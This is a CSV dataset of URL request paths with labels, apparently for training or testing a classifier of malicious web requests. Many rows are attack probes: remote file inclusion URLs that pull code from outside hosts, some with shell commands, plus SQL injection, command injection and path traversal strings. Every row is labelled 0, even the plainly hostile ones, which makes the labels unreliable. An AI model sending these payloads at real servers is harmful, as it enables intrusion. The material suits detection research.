url,label
/admin/classes/pear/spreadsheet/excel/writer.php?homedir=http://cirt.net/rfiinc.txt?,0
/_w0qqfromzr4qqsacatz74816qqsocmdzlistingitemlist/,0
/plugins/staticpages/functions.inc?_conf[path]=http://192.168.202.118:8080/tzhfyzkbomspvm?,0
/iron maiden - rock tv special on dance of death tour/,0
/kevin mitnick the art of deception includes chapter 1 banned ed/,0
/index.php?class_path=http://192.168.202.118:8080/2aibfaczmac8??,0
/docs/front-end-demo/cart2.php?workdir=http://192.168.202.96:8080/no4ghqiguzhst??,0
/includes/common.inc.php?config[base_path]=http://cirt.net/rfiinc.txt?,0
/inc/inc.php?cfg_racine=http://192.168.202.118:8080/zz5thkvtmlgl??,0
/fidbe34e84eff22a047aca19d7cc083294a6864a054/,0
/fid20052e617dfdb78281645030971dbd74bb03ee1b/,0
/_w0qqfromzr4qqfsooz1qqfsopz1qqsacatz20336qqsocmdzlistingitemlist/,0
/benny morton and jimmy hamilton blue note swingtets/,0
/onemustfallbattlegroundsv2095fixedexeeng/,0
/index.php?site_path=http://192.168.202.96:8080/4dckqcc0acprbz?,0
/inc_manager.php?include_path=@rfiurl?include_path=@rfiurl?,0
/after the sunset french ts share par drago/,0
/graph.php?document_root=http://cirt.net/rfiinc.txt??,0
/auction/includes/settings.inc.php?include_path=http://192.168.202.96:8080/ipb5ri??,0
/2180259641218737134303931843682884702013/,0
/admin/system/include.php?skindir=http://192.168.202.118:8080/2aibfaczmac8?,0
/recordings/index.php?edit=nonexistant1062946460,0
/olbookmarks-0.7.4/themes/test1.php?http://192.168.202.118:8080/tzhfyzkbomspvm?,0
/starnet/themes/c-sky/main.inc.php?cmsdir=http://192.168.202.118:8080/tzhfyzkbomspvm??,0
/library/js/fancybox/jquery.fancybox-1.2.6.js,0
/components/xmlparser/loadparser.php?absoluteurl=http://192.168.202.96:8080/4dckqcc0acprbz?,0
/tomcat_proxy_directory_traversal.nasl1331922018,0
/admin/index.php?xtrphome=http://192.168.202.118:8080/moclyxlwqyfjnp?,0
/gpb/include/db.mysql.inc.php?root_path=http://cirt.net/rfiinc.txt?,0
/classes/auth/yadis/xrds.php?_env[asicms][path]=http://192.168.202.118:8080/2aibfaczmac8?,0
/cgi-bin/tomcat_proxy_directory_traversal.nasl1331922018,0
/sb115880835590769754-9joo8mkjg21ajinhlpvevuujai0_20060928/,0
/latestposts.php?forumspath=http://cirt.net/rfiinc.txt?,0
/laserdisc_w0qqfromzr4qqsacategoryz381qqsocmdzlistingitemlist/,0
/immediate music - themes for orchestra and choir/,0
/read.php?data=http://192.168.202.96:8080/4dckqcc0acprbz??,0
/elseif/moduleajouter/depot/usrdepot.php?corpsdesignhttp://192.168.202.118:8080/moclyxlwqyfjnp?,0
/fid15d123c338ce6038f0cb940c70e9c4a6bd963880/,0
/iar embedded workbench for mitsubishi 740 v2/,0
/punk tv no5-a collection of rare tv appearances/,0
/page.php?id=http://cirt.net/rfiinc.txt?,0
/charlie and the chocolate factory tls tops/,0
/htdocs/gmapfactory/params.php?gszapppath=http://192.168.202.118:8080/ghl9il?,0
/home.php?a=http://192.168.202.118:8080/zz5thkvtmlgl?,0
/includes/common.inc.php?config[base_path]=http://192.168.202.96:8080/txenjrxf3?,0
/vcard/admin/define.inc.php?match=http://192.168.202.118:8080/zz5thkvtmlgl??&cmd=id,0
/load_phplib.php?_phplib[libdir]=http://cirt.net/rfiinc.txt?,0
/podcastgen1.0beta2/core/recent_list.php?absoluteurl=http://192.168.202.96:8080/4dckqcc0acprbz?,0
/hioxbannerrotate.php?hm=http://192.168.202.118:8080/moclyxlwqyfjnp?,0
/awzmb/modules/help.incl.php?setting[opt_includepath]=http://192.168.202.96:8080/4dckqcc0acprbz?,0
/examples/servlets/servlet/admin/define.inc.php?match=http://xxxx./,0
/admin/config.php?type=setup&display=extensions&extdisplay=`ls`,0
/8fa38899e03d5f083e6e3695424527defd0baceb/,0
/cms/meetweb/classes/regform.class.php?root_path=http://cirt.net/rfiinc.txt?,0
/lib/classes/swift/plugins/reporters/hitreporter.php.bak,0
/classes/core/language.php?rootdir=http://cirt.net/rfiinc.txt?,0
/b2e57dc349799fcbd730c6d844b978ebc49babc6/,0
/submit_abuse.php?path_prefix=http://192.168.202.118:8080/tzhfyzkbomspvm?,0
/vedit/editor/edit_htmlarea.php?highlighter=http://192.168.202.96:8080/4dckqcc0acprbz??,0
/include/dom.php?path=http://192.168.202.96:8080/txenjrxf3?,0
/templates/footer.inc.php?root=http://cirt.net/rfiinc.txt?,0
/index.php?url=http://192.168.202.118:8080/zz5thkvtmlgl?,0
/encyclopedia of multimedia technology and networking/,0
/1740373286363750109434240524890110813808/,0
/2346342815210998463426154983931326091467/,0
/ying yang twins - chemically imbalanced/,0
/protection.php?logout_page=http://192.168.202.118:8080/moclyxlwqyfjnp??,0
/jim reeves - welcome to my world  cd 02/,0
/classes/board_o.php?absolutepath=@rfiurl,0
/config/config_main.php?inc=@rfiurl?inc=@rfiurl?,0
/moteur/moteur.php?chemin=http://cirt.net/rfiinc.txt??,0
/biblioteca/lin_save.php?classpath=http://192.168.202.96:8080/llumt7msyau5y?,0
/inc/prepend.inc.php?path=@rfiurl?path=@rfiurl?,0
/agenda2.php3?rootagenda=http://192.168.202.96:8080/swgnhpydbq0t?,0
/classes/tech_o.php?absolutepath=http://192.168.202.96:8080/ipb5ri?,0
/epal/index.php?view=http://192.168.202.96:8080/no4ghqiguzhst??,0
/somaliasislamistforcesvacatelaststronghold/,0
/axoverzicht.cgi?maand=http://192.168.202.118:8080/ghl9il?,0
/config/config_member.php?inc=http://192.168.202.118:8080/moclyxlwqyfjnp??,0
/\xd0\x84\xd0\xb2\xd1\x80\xd0\xbe\xd0\xbf\xd0\xb0/,0
/top.php?stuff=(67777-pg_backend_pid()+34331),0
/epal/index.php?view=http://192.168.202.118:8080/moclyxlwqyfjnp??,0
/business plan and construction company/,0
/examples/jsp/jsp2/jspx/index.php?kietu[url_hit]=http://xxxxxxxx/,0
/recordings/comments.php?sort_by=phpwebgallery_sort_by_sql_injection.nasl,0
/basebuilder/src/main.inc.php?mj_config[src_path]=http://cirt.net/rfiinc.txt????,0
/jarre - making of gdansk concert part 1 of 5/,0
/examples/jsp/jsp2/jspx/search/show.pl?url=http://www.google.com,0
/recordings/index.php?doc=http://xxxxxx./foo.php,0
/examples/jsp/num/forum.php3?id_article=1&id_forum=-1/**/union/**/select 225310072--,0
/forum/member.php?repertorylevel=@rfiurl?repertorylevel=@rfiurl?,0
"/examples/jsp/num/spt--forumtopics.php?forumid=-9 union select null,null,null,1331904462,4,5",0
/m2f/m2f_forum.php?m2f_root_path=@rfiurl,0
/7650a137903fad2e94caf23bced9e1cf3da5449d/,0
/javascript/oracle.xml.xsql.xsqlservlet.csproj,0
/_blogadata/include/struct_admin.php?incl_page=http://192.168.202.96:8080/ipb5ri??,0
/\xe5\xbe\x9b\xe5\xae\xb6\xe4\xbd\xae\xe5\xae\xb6\xe5\xba\xad/,0
/athena.php?athena_dir=http://192.168.202.96:8080/frznctvhi0i5?,0
/modules/wiwimod/spaw/spaw_control.class.php?spaw_root=http://192.168.202.118:8080/zz5thkvtmlgl?,0
/init.php?api_home_dir=http://cirt.net/rfiinc.txt?,0
/jobline/admin.jobline.php?mosconfig_absolute_path=http://192.168.202.96:8080/txenjrxf3?,0
"/examples/jsp/checkbox/forum.php?forum=-1 union select null,123456,null,null,null,null--",0
/iar embedded workbench for atmel avr32 v2/,0
/dosearch.php?respath=http://192.168.202.96:8080/llumt7msyau5y?,0
/includes/mx_common.php?module_root_path=http://192.168.202.118:8080/zz5thkvtmlgl??,0
/c59f3b55b9757010vgnvcm1000004eecbccdrcrd/,0
/includes/usercp_viewprofile.php?phpbb_root_path=@rfiurl?phpbb_root_path=@rfiurl?,0
/admin/includes/spaw/spaw_control.class.php?spaw_root=http://192.168.202.96:8080/ipb5ri??,0
/girls boarding school carpetbeater spanking/,0
/lib/classes/swift/plugins/.decoratorplugin.php.swp,0
/components/minibb/index.php?absolute_path=http://cirt.net/rfiinc.txt?,0
/one step too far - faithless featuring dido/,0
/cgi-exe/gbadmin.cgi?action=change_adminpass,0
/examples/jsp/jsp2/simpletag/functions.java.html,0
/controllers/mysqlcontroller.php?basedir=http://192.168.202.96:8080/swgnhpydbq0t?,0
/vhost.php?action=logout&time=1332010196,0
/attack of the show- doug lombardi interview/,0
"/cgi-bin/spt--forumtopics.php?forumid=-9 union select null,null,null,1331908887,4,5",0
/mosaic_w0qqfromzr4qqsacatz28134qqsocmdzlistingitemlistqqsspagenamezdcpcraftsgraphic/,0
/cgi-bin/siteframe.php?local_path=macros/100-siteframe.macro\x00,0
/arab3upload/initialize.php?path=http://192.168.202.118:8080/ghl9il??&cmd=pwd,0
/engine/ajax/editnews.php?root_dir=http://192.168.202.118:8080/iroy1gvqrrqu?,0
/inc/mtdialogo.php?pathcgx=http://192.168.202.118:8080/moclyxlwqyfjnp?,0
/3916344562359439337010566507233264425696/,0
/judo vs jiu jitsu - kimura vs gracie i/,0
/function.inc.php?path=http://192.168.202.96:8080/4dckqcc0acprbz?,0
/personal computer world - october 2005/,0
/engine/init.php?root_dir=http://192.168.202.118:8080/iroy1gvqrrqu?,0
/ps2-goldeneye agente corrupto pal spanish fulldvd/,0
/home.php?a=http://192.168.202.118:8080/2aibfaczmac8?,0
"/cgi-bin/index.php?act=sm_window&page=event&day=-1 union select 1,1331919215,1990011133 --",0
/index.php?dept=http://cirt.net/rfiinc.txt?,0
/sites/samples/knowledge/membership/inspired/viewcode.asp,0
/jenna haze white stockings britney spears naked/,0
/pls/portal/portal.wwv_main.render_warning_screen?p_newurl=intellectpro&p_oldurl=intellectpro,0
/supasite/admin_mods.php?supa[db_path]=http://192.168.202.118:8080/ghl9il?,0
/champions league official highlights 8th mar 2005/,0
/editsite.php?returnpath=http://192.168.202.96:8080/llumt7msyau5y?,0
/playboy january 2007 - pamela anderson/,0
/22_ultimate/templates/header.php?mainpath=http://192.168.202.118:8080/ghl9il??,0
/no regrets a 10-step program for living in the present and leaving the past behind/,0
/biblioteca/bib_save.php?classpath=http://192.168.202.96:8080/whmch8ftkt7kv?,0
"/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331904439",0
/public_includes/pub_blocks/activecontent.php?vsdragonrootpath=http://cirt.net/rfiinc.txt?,0
/code/berylium-classes.php?beryliumroot=http://192.168.202.96:8080/llumt7msyau5y??,0
/sablonlar/gunaysoft/gunaysoft.php?sayfaid=http://cirt.net/rfiinc.txt?,0
/include/init.inc.php?g_path=http://192.168.202.96:8080/txenjrxf3?,0
/modules.php?name=http://192.168.202.118:8080/ghl9il?&file=article&sid=2,0
/_w0qqlotrz1qqsacategoryz1163qqsocmdzlistingitemlistqqsocolumnlayoutz3qqsocustoverridez1/,0
/claroline/phpbb/page_tail.php?includepath=http://192.168.202.118:8080/iroy1gvqrrqu?,0
/core/admin/admin.php?p=admin&absoluteurlhttp://192.168.202.96:8080/txenjrxf3?,0
/chalee tennison - parading in the rain/,0
/wwf warzone strategy guide creation discs/,0
/betablockmodules//module/module.php?path_prefix=http://192.168.202.118:8080/zz5thkvtmlgl?,0
/comedy central presents - pablo fransisco/,0
/b2verifauth.php?index=http://cirt.net/rfiinc.txt??,0
/fred eaglesmith - falling stars and broken hearts/,0
/questsoftwarewebsitearchivemanager0406/,0
/include/disp_smileys.php3?cfg_include_dir=http://cirt.net/rfiinc.txt??,0
/index.php?phpbb_root_path=http://192.168.202.118:8080/tzhfyzkbomspvm?,0
/lib/base.php?basecfg[basedir]=http://192.168.202.118:8080/tzhfyzkbomspvm?,0
/dj gt vs project c - voices of winter 2004/,0
/classes/auth/yadis/xrires.php?_env[asicms][path]=http://192.168.202.96:8080/ipb5ri?,0
/corpo.php?pagina=http://192.168.202.118:8080/moclyxlwqyfjnp?,0
/jmx-console/htmladaptor?action=inspectmbean&name=jboss.system:type=serverinfo,0
/fcring.php?s_fuss=http://192.168.202.96:8080/txenjrxf3?,0
/web/betablockmodules/largestgroupsmodule/largestgroupsmodule.php?path_prefix=@rfiurl,0
/22_ultimate/templates/header.php?mainpath=@rfiurl?mainpath=@rfiurl?,0
/total extreme wrestling 2005_information/,0
/cpqlogin.htm?redirecturl=/&redirectquerystring=,0
/coldfusion_double_encoded_null_info_disclosure-1331904662.asp%00.cfm,0
/en-us/static/@95063/img/skins/default/splunk_logo_black.png,0
/sources/admin/admin_templates.php?config[main_path]=http://192.168.202.118:8080/tzhfyzkbomspvm?,0
/3786878910058393460733141608171412460432/,0
/admin/catagory.php?language=http://192.168.202.118:8080/tzhfyzkbomspvm?,0
/lib/pcltrace.lib.php?g_pcltar_lib_dir=http://192.168.202.118:8080/ghl9il?,0
/client.php?dir=http://192.168.202.96:8080/ipb5ri?,0
/_friendly/core/data/_load.php?friendly_path=http://192.168.202.118:8080/zz5thkvtmlgl?,0
/submit_abuse.php?path_prefix=http://192.168.202.118:8080/zz5thkvtmlgl?,0
/lib/classes/swift/loadbalancedtransport.php~,0
/classes/class_admin.php?pathtocomment=http://192.168.202.96:8080/no4ghqiguzhst??,0
/administration/includes/deleteuser.php?path_prefix=http://192.168.202.118:8080/2aibfaczmac8?,0
/vietcong 2 pixel shader problem pls pls help!!!/,0
/flushcmd/include/editor/rich_files/class.rich.php?class_path=http://cirt.net/rfiinc.txt??,0
/minimal/wiki.php?page=http://192.168.202.118:8080/ghl9il??,0
/nucleus/plugins/skinfiles/index.php?dir_libs=http://cirt.net/rfiinc.txt?,0
/fid9cf0c13c21d3ea34eb81e3fce5781315320f8821/,0
/phplib/version/1.3.3/functionen/produkte_nach_serie.php?tt_docroot=http://cirt.net/rfiinc.txt?,0
/squery/lib/gore.php?libpath=http://192.168.202.118:8080/zz5thkvtmlgl?,0
/inc/irayofuncs.php?irayodirhack=http://192.168.202.96:8080/4dckqcc0acprbz??,0
/9 smokin cheerleaders from team in barnyard orgie/,0
/en-us/static/@95063/img/skins/default/loading_white.gif,0
/cactus bruce and the corporate monkeys v1/,0
/bcwb_path/system/default.css.php?root_path_admin=http://192.168.202.96:8080/no4ghqiguzhst?,0
/lib/classes/swift/swiftexception.php.~1~,0
/corpo.php?pagina=http://192.168.202.118:8080/ghl9il?,0
/rspa/framework/controller_v5.php?__includefilephpclass=http://cirt.net/rfiinc.txt?,0
/core/aural.php?site_absolute_path=http://192.168.202.96:8080/txenjrxf3??&cmd=dir,0
/crea.php?plancia=http://192.168.202.96:8080/no4ghqiguzhst?,0
/military funny hand to hand combat amateur/,0
/lib/classes/swift/characterstream/ngcharacterstream.php.copy,0
/phpmyadmin/index.php?db=mysql&token=9706b2572e3268bf1cadd0d9a13744dd,0
/examples/jsp/cal/administrator/index.php,0
/modules/4nalbum/public/displaycategory.php?basepath=http://192.168.202.118:8080/tzhfyzkbomspvm?,0
/en-us/account/include/help.php?base=http://xxxxxxxx,0
/xarg_corner.php?xarg=http://192.168.202.118:8080/tzhfyzkbomspvm??,0
/crazy frog - more crazy hits [2006][cd+3vids+cov]/,0
/wifeobjectstohusbandservingaspartyescort/,0
/black on blondes - paris hilton jungle fever/,0
/mcafeesecurityscalesmountainsofwebtraffic/,0
/dix.php3?url_phpartenaire=http://192.168.202.96:8080/swgnhpydbq0t?,0
/dbmodules/db_adodb.class.php?phpof_include_path=http://cirt.net/rfiinc.txt?,0
/gymnastics_w0qqfromzr4qqsacatz79792qqsocmdzlistingitemlistqqsspagenamezdcpsporttextnonfeat/,0
/ipswitch ws_ftp professional 2006 incl keygen-zwt/,0
/examples/jsp/colors/admin/operators.php?view,0
/files/message-reply.php3?bsx_libdir=@rfiurl,0
/02 harry potter and the chamber of secrets/,0
/cms/meetweb/classes/regresource.class.php?root_path=http://192.168.202.96:8080/llumt7msyau5y?,0
/main.php?logout=&del\xa0q67714263&rem\xa0,0
/includes/events.inc.php?pageprefix=http://192.168.202.118:8080/ghl9il?,0
/lib/classes/swift/replacementfilterfactory.php~,0
/someunexistantantsutff639843305142617511.html,0
/biblioteca/bib_plform.php?classpath=http://192.168.202.96:8080/no4ghqiguzhst?,0
/signer/final.php?smiley=http://192.168.202.118:8080/moclyxlwqyfjnp??,0
/lib/classes/swift/events/sendevent.php.bak,0
/enc/content.php?home_path=http://192.168.202.118:8080/zz5thkvtmlgl??,0
/m2f/m2f_forum.php?m2f_root_path=http://192.168.202.118:8080/moclyxlwqyfjnp?,0
/cgi-bin/ui/login?user=nessus-1332008314,0
/includes/xhtml.php?d_root=http://192.168.202.96:8080/4dckqcc0acprbz??,0
/styles.php?toroot=http://192.168.202.118:8080/ghl9il?,0
/1160821697_invisionpowerboardpackpplicenseppaddons11603419927801fv3/,0
/tools/send_reminders.php?includedir=http://test.acunetix.com/acunetix_not_execute?,0
/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1888332686--,0
/index.php?includesdir=http://192.168.202.118:8080/ghl9il?,0
/nena - und jetzt steh ich hier und warte/,0
/classes/auth/openid/filestore.php?_env[asicms][path]=http://192.168.202.96:8080/txenjrxf3?,0
/song.php?phpbb_root_path=http://192.168.202.118:8080/ghl9il?,0
/modules/mod_calendar.php?absolute_path=http://192.168.202.118:8080/tzhfyzkbomspvm?,0
/manager/index.php?action=login&module=users,0
/amazon/info.php?asin=http://192.168.202.118:8080/ghl9il?,0
/examples/jsp/security/protected/j_security_check.bak,0
/administrator/components/com_jreactions/langset.php?compath=http://cirt.net/rfiinc.txt??,0
/psp book harry potter and the prisoner of azkaban/,0
/examples/servlets/servlet/jcart-relay.php,0
/modules/groups/headerfile.php?system[path]=http://192.168.202.118:8080/zz5thkvtmlgl?,0
/betablockmodules/addmessagemodule/addmessagemodule.php?path_prefix=@rfiurl,0
/bowling for  columbine dvdrip svcd swesub cd2/,0
/hca - the ugly prince duckling_information/,0
/fidd4917af33797e4337d9021263b431fe2c0108931/,0
/shuttlelandingagreatchristmaspresentnasasays/,0
/dvd dj fantasy prensents - sourse mix videos v/,0
/louis armstrong and the blues singers 1924-1930/,0
/includes/functions/master.inc.php?fm_data[root]=http://cirt.net/rfiinc.txt??,0
/graph.php?document_root=http://192.168.202.118:8080/2aibfaczmac8??,0
/index.php?file_path=http://cirt.net/rfiinc.txt??,0
/widgets/base/footer.php?sys_dir=http://192.168.202.118:8080/ghl9il?,0
/fid371001ad5e954ae58bd3bca6f181505f7b4a60ed/,0
/admin/templates/template_thumbnail.php?thumb_template=http://cirt.net/rfiinc.txt?,0
/buena vista social club presents omara portuondo/,0
/luggage_w0qqfromzr0qqsacatz16080qqsocmdzlistingitemlistqqfclz3/,0
/accsess/login.php?path_to_root=http://192.168.202.96:8080/ipb5ri?,0
/salo storm software dialup password recovery v1/,0
/default_0b3921fae8ff4e8c95e42d9bed09f0a3/,0
/index.php?1=lol&pages[lol]=http://cirt.net/rfiinc.txt?,0
/index.php?config[mwchat_libs]=http://192.168.202.118:8080/ghl9il??,0
/mail/childwindow.inc.php?form=http://192.168.202.118:8080/ghl9il??,0
/help.php?q=http://www.q66469648.com/q91899811.htm,0
/0351664233149854695336780925091248835786/,0
/examples/jsp/security/protected/j_security_check.copy,0
/6f239367100e6010vgnvcm1000004eecbccdrcrd/,0
/ajouter.php?include=http://192.168.202.118:8080/zz5thkvtmlgl??,0
/admin/include/lib.module.php?mod_root=http://192.168.202.96:8080/llumt7msyau5y?,0
/include/class_yapbbcooker.php?cfgincludedirectory=http://cirt.net/rfiinc.txt?,0
/dialogs/table.php?spaw_dir=http://192.168.202.96:8080/llumt7msyau5y??&cmd=id,0
/fidf8b72f363aa1f7a6d94b88b3e89db13d9714d429/,0
/home.php?page=http://cirt.net/rfiinc.txt?,0
/en-us/static/@95063/css/skins/default/default.css,0
/biblioteca/bib_pldetails.php?classpath=http://192.168.202.96:8080/4dckqcc0acprbz?,0
/process.php?default_skin=http://192.168.202.118:8080/2aibfaczmac8?,0
/manual/rewrite/rewrite_guide_advanced.html,0
/cgibin/bbcode_ref.php?user=mtoxoje6mtoxoje6mtoxoje6li4vli4vli4vli4vli4vzxrjl3bhc3n3zaak,0
/arash_lib/class/arash_sadmin.class.php?arashlib_dir=http://192.168.202.96:8080/whmch8ftkt7kv?,0
/examples/jsp/jsp2/misc/dynamicattrs.jsp.tmp,0
/b2-tools/gm-2-b2.php?b2inc=http://xxxxxxxx,0
/examples/jsp/cal/shop.plx/page=nessus1775875794,0
/admin/include/lib.module.php?mod_root=http://192.168.202.96:8080/swgnhpydbq0t?,0
/phpmyadmin/index.php?act=help&do=aboutoat,0
/gallery/displaycategory.php?basepath=http://192.168.202.118:8080/iroy1gvqrrqu?,0
/examples/servlets/servlet/samba/smb2www.pl,0
/modules/bbcode_ref.php?user=mtoxoje6mtoxoje6mtoxoje6li4vli4vli4vli4vli4vzxrjl3bhc3n3zaak,0
/3124071330413839249326935838591548202759/,0
/lib/classes/swift/loadbalancedtransport.php.1,0
/fid7aca175a748fcb9afb2406e32f0264778ed09188/,0
/en-us/static/@95063/js/contrib/snoopservlet/,0
/jerome rothenberg  a merz sonata 1985nmwa/,0
/examples/jsp/jsp2/jspx/index.php?action=login&module=users,0
/japan 2006 world championship center_information/,0
/flickrclient.php?path_prefix=http://192.168.202.96:8080/whmch8ftkt7kv?,0
/admin/classes/pear/ole/pps/file.php?homedir=http://192.168.202.96:8080/txenjrxf3?,0
/classes/auth/openid/message.php?_env[asicms][path]=http://cirt.net/rfiinc.txt?,0
/richie sambora - stranger in this town/,0
/cd-rom drivers vol 2 clube do hardware by zinid1 compartilhando/,0
/lib/classes/swift/mime/contentencoder/nessus/,0
/files/login.php3?err=hack&bsx_htxdir=http://192.168.202.118:8080/zz5thkvtmlgl?,0
/javascript/oracle.xml.xsql.xsqlservlet.sql,0
/main_prepend.php?_serweb[functionsdir]=http://192.168.202.96:8080/4dckqcc0acprbz?,0
/clear.php?bibtexrootrel=http://192.168.202.96:8080/llumt7msyau5y??,0
/arsenal - 49 the complete unbeaten record/,0
/examples/jsp/sessions/includer.cgi?template=includer_rcmdexec.nasl,0
/calendar.php?lang=http://192.168.202.118:8080/ghl9il?,0
